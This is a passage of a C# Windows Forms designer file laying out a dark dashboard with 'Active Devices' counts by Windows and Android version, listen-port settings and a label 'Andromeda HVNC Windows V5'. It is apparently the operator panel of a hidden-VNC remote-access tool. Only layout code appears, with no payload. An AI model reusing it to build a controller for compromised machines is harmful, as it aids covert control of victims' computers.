            this.guna2HtmlLabel12.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlLabel12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.guna2HtmlLabel12.Location = new System.Drawing.Point(233, 185);
            this.guna2HtmlLabel12.Name = "guna2HtmlLabel12";
            this.guna2HtmlLabel12.Size = new System.Drawing.Size(80, 19);
            this.guna2HtmlLabel12.TabIndex = 115;
            this.guna2HtmlLabel12.Text = "Windows 8.0";
            // 
            // guna2PictureBox5
            // 
            this.guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox5.Image")));
            this.guna2PictureBox5.ImageRotate = 0F;
            this.guna2PictureBox5.Location = new System.Drawing.Point(202, 214);
            this.guna2PictureBox5.Name = "guna2PictureBox5";
            this.guna2PictureBox5.Size = new System.Drawing.Size(20, 20);
            this.guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox5.TabIndex = 118;
            this.guna2PictureBox5.TabStop = false;
            this.guna2PictureBox5.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel87
            // 
            this.Guna2HtmlLabel87.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel87, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel87, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel87.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel87.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel87.Location = new System.Drawing.Point(54, 146);
            this.Guna2HtmlLabel87.Name = "Guna2HtmlLabel87";
            this.Guna2HtmlLabel87.Size = new System.Drawing.Size(32, 15);
            this.Guna2HtmlLabel87.TabIndex = 110;
            this.Guna2HtmlLabel87.Text = "Baixo";
            // 
            // Guna2HtmlLabel59
            // 
            this.Guna2HtmlLabel59.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel59, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel59, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel59.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel59.ForeColor = System.Drawing.Color.Silver;
            this.Guna2HtmlLabel59.Location = new System.Drawing.Point(106, 13);
            this.Guna2HtmlLabel59.Name = "Guna2HtmlLabel59";
            this.Guna2HtmlLabel59.Size = new System.Drawing.Size(109, 23);
            this.Guna2HtmlLabel59.TabIndex = 67;
            this.Guna2HtmlLabel59.Text = "Active Devices";
            // 
            // Guna2HtmlLabel86
            // 
            this.Guna2HtmlLabel86.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel86, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel86, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel86.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel86.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel86.Location = new System.Drawing.Point(232, 146);
            this.Guna2HtmlLabel86.Name = "Guna2HtmlLabel86";
            this.Guna2HtmlLabel86.Size = new System.Drawing.Size(32, 15);
            this.Guna2HtmlLabel86.TabIndex = 108;
            this.Guna2HtmlLabel86.Text = "Baixo";
            // 
            // Guna2PictureBox35
            // 
            this.Guna2PictureBox35.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox35, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox35.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox35.Image")));
            this.Guna2PictureBox35.ImageRotate = 0F;
            this.Guna2PictureBox35.Location = new System.Drawing.Point(18, 71);
            this.Guna2PictureBox35.Name = "Guna2PictureBox35";
            this.Guna2PictureBox35.Size = new System.Drawing.Size(25, 25);
            this.Guna2PictureBox35.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox35.TabIndex = 79;
            this.Guna2PictureBox35.TabStop = false;
            this.Guna2PictureBox35.UseTransparentBackground = true;
            // 
            // Android11_Red
            // 
            this.Android11_Red.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Android11_Red, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Android11_Red, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Android11_Red.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Android11_Red.ForeColor = System.Drawing.Color.Red;
            this.Android11_Red.Location = new System.Drawing.Point(26, 144);
            this.Android11_Red.Name = "Android11_Red";
            this.Android11_Red.Size = new System.Drawing.Size(17, 17);
            this.Android11_Red.TabIndex = 109;
            this.Android11_Red.Text = "+0";
            // 
            // Android12_Red
            // 
            this.Android12_Red.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Android12_Red, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Android12_Red, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Android12_Red.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Android12_Red.ForeColor = System.Drawing.Color.Red;
            this.Android12_Red.Location = new System.Drawing.Point(205, 144);
            this.Android12_Red.Name = "Android12_Red";
            this.Android12_Red.Size = new System.Drawing.Size(17, 17);
            this.Android12_Red.TabIndex = 70;
            this.Android12_Red.Text = "+3";
            // 
            // Guna2PictureBox41
            // 
            this.Guna2PictureBox41.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox41, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox41.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox41.Image")));
            this.Guna2PictureBox41.ImageRotate = 0F;
            this.Guna2PictureBox41.Location = new System.Drawing.Point(23, 106);
            this.Guna2PictureBox41.Name = "Guna2PictureBox41";
            this.Guna2PictureBox41.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox41.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox41.TabIndex = 92;
            this.Guna2PictureBox41.TabStop = false;
            this.Guna2PictureBox41.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel83
            // 
            this.Guna2HtmlLabel83.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel83, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel83, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel83.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel83.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel83.Location = new System.Drawing.Point(231, 129);
            this.Guna2HtmlLabel83.Name = "Guna2HtmlLabel83";
            this.Guna2HtmlLabel83.Size = new System.Drawing.Size(45, 15);
            this.Guna2HtmlLabel83.TabIndex = 107;
            this.Guna2HtmlLabel83.Text = "Maximo";
            // 
            // Guna2HtmlLabel72
            // 
            this.Guna2HtmlLabel72.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel72, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel72, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel72.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel72.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel72.Location = new System.Drawing.Point(49, 111);
            this.Guna2HtmlLabel72.Name = "Guna2HtmlLabel72";
            this.Guna2HtmlLabel72.Size = new System.Drawing.Size(75, 15);
            this.Guna2HtmlLabel72.TabIndex = 93;
            this.Guna2HtmlLabel72.Text = "Ultimo tempo";
            // 
            // Guna2HtmlLabel66
            // 
            this.Guna2HtmlLabel66.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel66, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel66, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel66.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel66.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel66.Location = new System.Drawing.Point(49, 77);
            this.Guna2HtmlLabel66.Name = "Guna2HtmlLabel66";
            this.Guna2HtmlLabel66.Size = new System.Drawing.Size(73, 19);
            this.Guna2HtmlLabel66.TabIndex = 80;
            this.Guna2HtmlLabel66.Text = "Windows 11";
            // 
            // Android12_Green
            // 
            this.Android12_Green.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Android12_Green, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Android12_Green, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Android12_Green.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Android12_Green.ForeColor = System.Drawing.Color.Green;
            this.Android12_Green.Location = new System.Drawing.Point(202, 127);
            this.Android12_Green.Name = "Android12_Green";
            this.Android12_Green.Size = new System.Drawing.Size(17, 17);
            this.Android12_Green.TabIndex = 106;
            this.Android12_Green.Text = "+9";
            // 
            // Android11_Green
            // 
            this.Android11_Green.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Android11_Green, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Android11_Green, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Android11_Green.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Android11_Green.ForeColor = System.Drawing.Color.Green;
            this.Android11_Green.Location = new System.Drawing.Point(19, 127);
            this.Android11_Green.Name = "Android11_Green";
            this.Android11_Green.Size = new System.Drawing.Size(24, 17);
            this.Android11_Green.TabIndex = 104;
            this.Android11_Green.Text = "+12";
            // 
            // Guna2HtmlLabel81
            // 
            this.Guna2HtmlLabel81.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel81, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel81, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel81.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel81.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel81.Location = new System.Drawing.Point(51, 129);
            this.Guna2HtmlLabel81.Name = "Guna2HtmlLabel81";
            this.Guna2HtmlLabel81.Size = new System.Drawing.Size(45, 15);
            this.Guna2HtmlLabel81.TabIndex = 105;
            this.Guna2HtmlLabel81.Text = "Maximo";
            // 
            // Guna2PictureBox36
            // 
            this.Guna2PictureBox36.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox36, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox36.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox36.Image")));
            this.Guna2PictureBox36.ImageRotate = 0F;
            this.Guna2PictureBox36.Location = new System.Drawing.Point(202, 71);
            this.Guna2PictureBox36.Name = "Guna2PictureBox36";
            this.Guna2PictureBox36.Size = new System.Drawing.Size(25, 25);
            this.Guna2PictureBox36.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox36.TabIndex = 81;
            this.Guna2PictureBox36.TabStop = false;
            this.Guna2PictureBox36.UseTransparentBackground = true;
            // 
            // Guna2HtmlLabel73
            // 
            this.Guna2HtmlLabel73.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel73, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel73, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel73.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel73.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel73.Location = new System.Drawing.Point(228, 111);
            this.Guna2HtmlLabel73.Name = "Guna2HtmlLabel73";
            this.Guna2HtmlLabel73.Size = new System.Drawing.Size(75, 15);
            this.Guna2HtmlLabel73.TabIndex = 95;
            this.Guna2HtmlLabel73.Text = "Ultimo tempo";
            // 
            // Guna2HtmlLabel67
            // 
            this.Guna2HtmlLabel67.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel67, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel67, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel67.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel67.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel67.Location = new System.Drawing.Point(233, 77);
            this.Guna2HtmlLabel67.Name = "Guna2HtmlLabel67";
            this.Guna2HtmlLabel67.Size = new System.Drawing.Size(75, 19);
            this.Guna2HtmlLabel67.TabIndex = 82;
            this.Guna2HtmlLabel67.Text = "Windows 10";
            // 
            // Guna2PictureBox42
            // 
            this.Guna2PictureBox42.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.Guna2PictureBox42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Guna2PictureBox42, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2PictureBox42.Image = ((System.Drawing.Image)(resources.GetObject("Guna2PictureBox42.Image")));
            this.Guna2PictureBox42.ImageRotate = 0F;
            this.Guna2PictureBox42.Location = new System.Drawing.Point(202, 106);
            this.Guna2PictureBox42.Name = "Guna2PictureBox42";
            this.Guna2PictureBox42.Size = new System.Drawing.Size(20, 20);
            this.Guna2PictureBox42.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Guna2PictureBox42.TabIndex = 94;
            this.Guna2PictureBox42.TabStop = false;
            this.Guna2PictureBox42.UseTransparentBackground = true;
            // 
            // Moldura
            // 
            this.Moldura.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Moldura.BackColor = System.Drawing.Color.Transparent;
            this.Moldura.BorderRadius = 25;
            this.guna2Transition2.SetDecoration(this.Moldura, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2Transition1.SetDecoration(this.Moldura, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Moldura.Image = ((System.Drawing.Image)(resources.GetObject("Moldura.Image")));
            this.Moldura.ImageRotate = 0F;
            this.Moldura.Location = new System.Drawing.Point(6, 6);
            this.Moldura.Name = "Moldura";
            this.Moldura.Size = new System.Drawing.Size(720, 450);
            this.Moldura.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Moldura.TabIndex = 142;
            this.Moldura.TabStop = false;
            this.Moldura.UseTransparentBackground = true;
            // 
            // Painel_Ports
            // 
            this.Painel_Ports.Controls.Add(this.Guna2GradientPanel12);
            this.Painel_Ports.Controls.Add(this.Guna2GradientPanel13);
            this.Guna2Transition1.SetDecoration(this.Painel_Ports, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Painel_Ports, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Painel_Ports.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Painel_Ports.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Ports.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Painel_Ports.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Painel_Ports.Location = new System.Drawing.Point(224, 73);
            this.Painel_Ports.Name = "Painel_Ports";
            this.Painel_Ports.Size = new System.Drawing.Size(1084, 738);
            this.Painel_Ports.TabIndex = 171;
            this.Painel_Ports.Visible = false;
            // 
            // Guna2GradientPanel12
            // 
            this.Guna2GradientPanel12.AutoScroll = true;
            this.Guna2GradientPanel12.BorderRadius = 10;
            this.Guna2GradientPanel12.BorderThickness = 1;
            this.Guna2GradientPanel12.Controls.Add(this.Guna2TextBox8);
            this.Guna2GradientPanel12.Controls.Add(this.Guna2HtmlLabel84);
            this.Guna2GradientPanel12.Controls.Add(this.Guna2HtmlLabel82);
            this.Guna2GradientPanel12.Controls.Add(this.Guna2HtmlLabel80);
            this.Guna2Transition1.SetDecoration(this.Guna2GradientPanel12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2GradientPanel12, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2GradientPanel12.Dock = System.Windows.Forms.DockStyle.Top;
            this.Guna2GradientPanel12.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2GradientPanel12.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2GradientPanel12.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.Guna2GradientPanel12.Location = new System.Drawing.Point(0, 0);
            this.Guna2GradientPanel12.Name = "Guna2GradientPanel12";
            this.Guna2GradientPanel12.Size = new System.Drawing.Size(378, 686);
            this.Guna2GradientPanel12.TabIndex = 97;
            // 
            // Guna2TextBox8
            // 
            this.Guna2TextBox8.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox8.BorderRadius = 3;
            this.Guna2TextBox8.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Guna2Transition1.SetDecoration(this.Guna2TextBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2TextBox8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2TextBox8.DefaultText = resources.GetString("Guna2TextBox8.DefaultText");
            this.Guna2TextBox8.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.Guna2TextBox8.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.Guna2TextBox8.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox8.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.Guna2TextBox8.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(7)))), ((int)(((byte)(11)))), ((int)(((byte)(41)))));
            this.Guna2TextBox8.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox8.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2TextBox8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox8.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.Guna2TextBox8.Location = new System.Drawing.Point(10, 69);
            this.Guna2TextBox8.Multiline = true;
            this.Guna2TextBox8.Name = "Guna2TextBox8";
            this.Guna2TextBox8.PasswordChar = '\0';
            this.Guna2TextBox8.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(111)))), ((int)(((byte)(128)))), ((int)(((byte)(115)))));
            this.Guna2TextBox8.PlaceholderText = "9090";
            this.Guna2TextBox8.ReadOnly = true;
            this.Guna2TextBox8.SelectedText = "";
            this.Guna2TextBox8.Size = new System.Drawing.Size(363, 614);
            this.Guna2TextBox8.TabIndex = 118;
            // 
            // Guna2HtmlLabel84
            // 
            this.Guna2HtmlLabel84.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel84, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel84, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel84.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel84.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(152)))), ((int)(((byte)(172)))));
            this.Guna2HtmlLabel84.Location = new System.Drawing.Point(9, 75);
            this.Guna2HtmlLabel84.Name = "Guna2HtmlLabel84";
            this.Guna2HtmlLabel84.Size = new System.Drawing.Size(3, 2);
            this.Guna2HtmlLabel84.TabIndex = 118;
            this.Guna2HtmlLabel84.Text = null;
            this.Guna2HtmlLabel84.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Guna2HtmlLabel82
            // 
            this.Guna2HtmlLabel82.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel82, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel82, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel82.Font = new System.Drawing.Font("Segoe UI Semibold", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel82.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(131)))), ((int)(((byte)(190)))), ((int)(((byte)(235)))));
            this.Guna2HtmlLabel82.Location = new System.Drawing.Point(9, 51);
            this.Guna2HtmlLabel82.Name = "Guna2HtmlLabel82";
            this.Guna2HtmlLabel82.Size = new System.Drawing.Size(162, 15);
            this.Guna2HtmlLabel82.TabIndex = 118;
            this.Guna2HtmlLabel82.Text = "Andromeda HVNC Windows V5";
            // 
            // Guna2HtmlLabel80
            // 
            this.Guna2HtmlLabel80.BackColor = System.Drawing.Color.Transparent;
            this.Guna2Transition1.SetDecoration(this.Guna2HtmlLabel80, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Guna2HtmlLabel80, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Guna2HtmlLabel80.Font = new System.Drawing.Font("Microsoft New Tai Lue", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2HtmlLabel80.ForeColor = System.Drawing.Color.White;
            this.Guna2HtmlLabel80.Location = new System.Drawing.Point(9, 16);
            this.Guna2HtmlLabel80.Name = "Guna2HtmlLabel80";
            this.Guna2HtmlLabel80.Size = new System.Drawing.Size(248, 29);
            this.Guna2HtmlLabel80.TabIndex = 118;
            this.Guna2HtmlLabel80.Text = "Notícias do desenvolvedor";
            // 
            // Guna2GradientPanel13
            // 
            this.Guna2GradientPanel13.BorderRadius = 10;
            this.Guna2GradientPanel13.BorderThickness = 1;
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel118);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2Button3);
            this.Guna2GradientPanel13.Controls.Add(this.StartPort);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox7);
            this.Guna2GradientPanel13.Controls.Add(this.ListenPort);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel109);
            this.Guna2GradientPanel13.Controls.Add(this.guna2HtmlLabel49);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel52);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel56);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox2);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox15);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel50);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel108);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel110);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox14);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox3);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox1);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel111);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox13);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox62);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel115);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2Button2);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox12);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2CheckBox2);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel78);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel114);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel119);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox63);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox9);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel54);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel120);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox60);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel121);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel76);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox10);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel122);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox59);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2TextBox11);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2HtmlLabel113);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox48);
            this.Guna2GradientPanel13.Controls.Add(this.Guna2PictureBox58);
